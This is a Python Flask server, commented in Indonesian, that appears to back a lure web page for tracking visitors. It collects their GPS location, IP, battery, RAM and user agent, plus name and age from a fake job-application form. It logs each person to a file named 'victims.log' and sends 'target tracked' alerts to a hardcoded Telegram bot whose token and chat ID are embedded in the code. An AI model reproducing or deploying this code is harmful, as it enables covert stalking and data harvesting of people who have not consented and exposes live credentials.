from flask import Flask, request, send_from_directory, jsonify
from flask_cors import CORS
import datetime, os, json, socket, requests, time

app = Flask(__name__)
CORS(app)

# === KONFIGURASI ===
TELEGRAM_TOKEN = "7614148489:AAFuwjUfdI41MTRxz_b_p7T_yNbiTkVyVs0"
TELEGRAM_CHAT_ID = "8180344345"
API_KEY = "cobraproject"

def kirim_telegram(pesan):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": pesan,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        res = requests.post(url, data=data)
        if res.status_code != 200:
            print("❌ Telegram gagal:", res.text)
    except Exception as e:
        print("❌ Gagal kirim ke Telegram:", e)

def get_location_info(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
        headers = {'User-Agent': 'CobraMD-Locator'}
        res = requests.get(url, headers=headers, timeout=5)
        data = res.json()
        address = data.get("address", {})
        daerah = address.get("suburb") or address.get("village") or address.get("state_district") or "Unknown"
        kota = address.get("city") or address.get("town") or address.get("county") or "Unknown"
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        return maps_link, kota, daerah
    except:
        return "GAGAL AMBIL MAP", "Unknown", "Unknown"

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/log', methods=['POST'])
def log():
    auth = request.headers.get("Authorization")
    if auth != f"Bearer {API_KEY}":
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_json()
    if not data:
        return jsonify({"error": "Invalid JSON"}), 400

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    time_now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    try:
        hostname = socket.gethostbyaddr(ip)[0]
    except:
        hostname = "Unknown"

    latitude = data.get("lat")
    longitude = data.get("lon")
    accuracy = data.get("acc")
    user_agent = data.get("ua")
    memory = data.get("memory", "Unknown")
    platform = data.get("platform", "Unknown")
    battery = data.get("battery", "Unknown")
    location_status = "✅ LOKASI TEREKAM" if latitude else "❌ GAGAL REKAM"

    if latitude and longitude:
        maps_link, kota, daerah = get_location_info(latitude, longitude)
    else:
        maps_link, kota, daerah = "-", "Unknown", "Unknown"

    log_data = {
        "time": time_now,
        "ip": ip,
        "hostname": hostname,
        "location": {
            "latitude": latitude,
            "longitude": longitude,
            "accuracy": accuracy,
            "maps": maps_link,
            "kota": kota,
            "daerah": daerah
        },
        "device": {
            "battery": battery,
            "ram": memory,
            "platform": platform,
            "user-agent": user_agent
        }
    }

    try:
        os.makedirs("logs", exist_ok=True)
        safe_ip = ip.replace(".", "_")
        filename = f"logs/{safe_ip}_{time_now.replace(':', '-')}.json"
        with open(filename, "w") as f:
            json.dump(log_data, f, indent=2)
    except Exception as e:
        print(f"❌ Gagal simpan file log: {e}")

    with open("victims.log", "a") as f:
        f.write(json.dumps(log_data, indent=2) + "\n---\n")

    with open("device.log", "a") as f:
        f.write(json.dumps({
            "ip": ip,
            "time": time_now,
            "battery": battery,
            "ram": memory,
            "platform": platform,
            "user-agent": user_agent
        }, indent=2) + "\n---\n")

    if latitude:
        msg = f"""<b>🐍 TARGET TERLACAK</b>
<b>📍 Lokasi:</b> <a href="{maps_link}">Klik Buka Maps</a>
<b>🌆 Daerah:</b> {daerah}
<b>🏙️ Kota:</b> {kota}

<b>💻 IP:</b> <code>{ip}</code>
<b>🕒 Waktu:</b> {time_now}

<b>🔋 Baterai:</b> {battery}
<b>💾 RAM:</b> {memory} GB
<b>🧱 Platform:</b> {platform}
"""
    else:
        msg = f"""<b>🚨 TARGET MENOLAK LOKASI</b>
<b>💻 IP:</b> <code>{ip}</code>
<b>🕒 Waktu:</b> {time_now}
<b>🧬 User-Agent:</b> {user_agent}
<b>🔋 Baterai:</b> {battery}
<b>💾 RAM:</b> {memory} GB
<b>🧱 Platform:</b> {platform}
"""

    kirim_telegram(msg)

    print("\n" + "="*60)
    print(f" ☠️  [ADA YANG MASUK SARANG ULAR] — {ip}")
    print(f" 🕒 Waktu        : {time_now}")
    print(f" 🌐 Hostname     : {hostname}")
    print(f" 📡 Lokasi       : {location_status}")
    if latitude:
        print(f"    ↪️ Latitude    : {latitude}")
        print(f"    ↪️ Longitude   : {longitude}")
        print(f"    ↪️ Akurasi     : {accuracy} m")
        print(f" 🗺️ Maps Link    : {maps_link}")
        print(f" 🏞️ Daerah        : {daerah}")
        print(f" 🏙️ Kota/Asal     : {kota}")
    print(f" 📱 Device       :")
    print(f"    🔋 Baterai    : {battery}")
    print(f"    💾 RAM        : {memory}")
    print(f"    🧱 Platform    : {platform}")
    print(f" 🧬 User-Agent   : {user_agent}")
    print("="*60)

    return jsonify({"status": "OK", "ip": ip, "maps": maps_link}), 200

@app.route('/kirimdata', methods=['POST'])
def kirimdata():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "msg": "No data"})

    waktu = data.get("waktu") or datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    fitur = data.get("fitur") or "Unknown"
    nama = data.get("nama")
    umur = data.get("umur")
    minat = data.get("minat")
    lat = data.get("lat")
    lon = data.get("lon")

    if lat and lon:
        maps_link, kota, daerah = get_location_info(lat, lon)
    else:
        maps_link, kota, daerah = "-", "Unknown", "Unknown"

    pesan = f"<b>📨 DATA MASUK DARI COBRA WEB</b>\n"
    pesan += f"<b>📅 Waktu:</b> {waktu}\n"
    pesan += f"<b>🛠️ Fitur:</b> {fitur}\n"

    if fitur == "Form Lamaran":
        pesan += f"<b>🧍 Nama:</b> {nama}\n"
        pesan += f"<b>🎂 Umur:</b> {umur}\n"
        pesan += f"<b>💼 Minat:</b> {minat}\n"

    if lat and lon:
        pesan += f"<b>📍 Lokasi:</b> <a href='{maps_link}'>Klik Buka Maps</a>\n"
        pesan += f"<b>🌆 Kota:</b> {kota}\n"
        pesan += f"<b>🏞️ Daerah:</b> {daerah}\n"

    kirim_telegram(pesan)
    print(f"✅ Data dari fitur '{fitur}' diterima dan dikirim ke Telegram.")
    return jsonify({"success": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9595)